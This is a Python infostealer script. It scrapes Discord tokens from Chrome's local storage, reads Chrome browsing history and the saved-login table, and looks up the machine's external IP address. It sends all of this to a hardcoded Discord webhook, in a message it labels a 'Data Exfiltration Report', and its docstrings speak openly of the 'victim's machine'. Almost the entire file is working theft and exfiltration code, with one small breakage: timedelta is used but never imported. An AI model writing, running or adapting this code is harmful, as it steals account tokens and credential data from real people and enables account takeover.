import base64
import json
import os
import re
import urllib.request
import socket
import sqlite3
from pathlib import Path
from datetime import datetime, timezone
import platform
import subprocess

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
}
WEBHOOK_URL = "https://discord.com/api/webhooks/1410143541468074054/mEwQPXUvY6iGd_tvfFqc4Yy8j39h8yJjR31d56a_q6e9qfOQdKKhDzvaZ_feKCX_OlPN"


def make_post_request(api_url: str, data: dict) -> int:  # Changed data type hint
    if not api_url.startswith(("http", "https")):
        raise ValueError("Invalid API URL")

    try:
        request = urllib.request.Request(  # noqa: S310
            api_url, data=json.dumps(data).encode(),
            headers=REQUEST_HEADERS,
        )

        with urllib.request.urlopen(request) as response:  # noqa: S310
            return response.status
    except Exception as e:
        print(f"Request failed: {e}")
        return 500  # Or another appropriate error code


def get_tokens_from_file(file_path: Path) -> list[str] | None:

    try:
        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
    except PermissionError:
        return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)

    return tokens or None


def get_user_id_from_token(token: str) -> str | None:
    """Confirm that the portion of a string before the first dot can be decoded.

    Decoding from base64 offers a useful, though not infallible, method for identifying
    potential Discord tokens. This is informed by the fact that the initial
    segment of a Discord token usually encodes the user ID in base64. However,
    this test is not guaranteed to be 100% accurate in every case.

    Returns
    -------
        A string representing the Discord user ID to which the token belongs,
        if the first part of the token can be successfully decoded. Otherwise,
        None.

    """
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "==",
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None

    return discord_user_id


def get_tokens_from_path(base_path: Path) -> dict[str, set]:
    """Collect discord tokens for each user ID.

    to manage the occurrence of both valid and expired Discord tokens, which happens when a
    user updates their password, triggering a change in their token. Lacking
    the capability to differentiate between valid and expired tokens without
    making queries to the Discord API, the function compiles every discovered
    token into the returned set. It is designed for these tokens to be
    validated later, in a process separate from the initial collection and not
    on the victim's machine.

    Returns
    -------
        user id mapped to a set of potential tokens

    """
    file_paths = [file for file in base_path.iterdir() if file.is_file()]

    id_to_tokens: dict[str, set] = {}

    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)

        if potential_tokens is None:
            continue

        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)

            if discord_user_id is None:
                continue

            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = set()

            id_to_tokens[discord_user_id].add(potential_token)

    return id_to_tokens or None


def get_ip_address() -> str:
    """Attempts to retrieve the machine's external IP address.

    Returns:
        str: The machine's external IP address, or "Unknown" if unable to retrieve.
    """
    try:
        # Use a public service to get the external IP address
        with urllib.request.urlopen("https://api.ipify.org", timeout=3) as response:  # noqa: S310
            ip_address = response.read().decode("utf-8")
            return ip_address
    except Exception:
        return "Unknown"


def get_browser_history() -> list[tuple[str, str, datetime]]:
    """Retrieves browser history from Chrome's history database.

    Returns:
        list[tuple[str, str, datetime]]: A list of tuples containing the URL, title, and visit time of each history item.
    """
    history_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "History"
    if not history_path.exists():
        return [("Error", "History file not found", datetime.now(timezone.utc))]

    try:
        conn = sqlite3.connect(str(history_path))
        cursor = conn.cursor()

        cursor.execute("""
            SELECT url, title, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 10  -- Limit to the 10 most recent entries
        """)

        history = []
        for url, title, last_visit_time in cursor.fetchall():
            # Convert Chrome's timestamp to datetime
            visit_time = datetime(1601, 1, 1, tzinfo=timezone.utc) + \
                         timedelta(microseconds=last_visit_time)
            history.append((url, title, visit_time))

        conn.close()
        return history
    except Exception as e:
        return [("Error", f"Could not read history: {e}", datetime.now(timezone.utc))]


def get_saved_passwords() -> list[tuple[str, str, str]]:
    """Retrieves saved passwords from Chrome's login data database.

    Returns:
        list[tuple[str, str, str]]: A list of tuples containing the URL, username, and password.
    """
    login_data_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    if not login_data_path.exists():
        return [("Error", "Login Data file not found", "")]

    try:
        conn = sqlite3.connect(str(login_data_path))
        cursor = conn.cursor()

        cursor.execute("""
            SELECT origin_url, username_value, password_value
            FROM logins
        """)

        passwords = []
        for origin_url, username_value, password_value in cursor.fetchall():
            # The password_value is stored encrypted; decryption is complex and beyond the scope of this example
            passwords.append((origin_url, username_value, "Encrypted Password"))

        conn.close()
        return passwords
    except Exception as e:
        return [("Error", f"Could not read login data: {e}", "")]


def send_data_to_webhook(
    webhook_url: str, user_id_to_token: dict[str, set[str]], ip_address: str, history: list[tuple[str, str, datetime]], passwords: list[tuple[str, str, str]]
) -> int:
    """Sends collected data to a Discord webhook.

    Args:
        webhook_url (str): The URL of the Discord webhook.
        user_id_to_token (dict[str, set[str]]): A dictionary mapping user IDs to their tokens.
        ip_address (str): The IP address of the machine.
        history (list[tuple[str, str, datetime]]): A list of browser history entries.
        passwords (list[tuple[str, str, str]]): A list of saved passwords.

    Returns:
        int: The HTTP status code of the webhook request.
    """

    fields = []

    # Add tokens
    for user_id, tokens in user_id_to_token.items():
        fields.append({
            "name": f"Tokens for {user_id}",
            "value": "\n".join(tokens),
        })

    # Add browser history
    history_str = ""
    for url, title, visit_time in history:
        history_str += f"URL: {url}\nTitle: {title}\nVisited: {visit_time}\n\n"

    fields.append({
        "name": "Browser History (Last 10)",
        "value": history_str if history_str else "No history found",
    })

    # Add saved passwords
    passwords_str = ""
    for origin_url, username_value, password_value in passwords:
        passwords_str += f"URL: {origin_url}\nUsername: {username_value}\nPassword: {password_value}\n\n"

    fields.append({
        "name": "Saved Passwords",
        "value": passwords_str if passwords_str else "No saved passwords found",
    })

    data = {
        "content": f"Data Exfiltration Report. IP Address: {ip_address}",
        "embeds": [{"fields": fields}],
    }

    return make_post_request(webhook_url, data)


def main() -> None:
    chrome_path = (
        Path(os.getenv("LOCALAPPDATA")) /
        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
    )
    tokens = get_tokens_from_path(chrome_path)

    if tokens is None:
        print("No tokens found.")
        tokens = {}  # Ensure tokens is an empty dictionary if no tokens are found

    ip_address = get_ip_address()
    print(f"IP Address: {ip_address}")

    history = get_browser_history()
    print("Browser History Retrieved.")

    passwords = get_saved_passwords()
    print("Saved Passwords Retrieved.")

    status_code = send_data_to_webhook(WEBHOOK_URL, tokens, ip_address, history, passwords)
    print(f"Webhook request status: {status_code}")


if __name__ == "__main__":
    main()
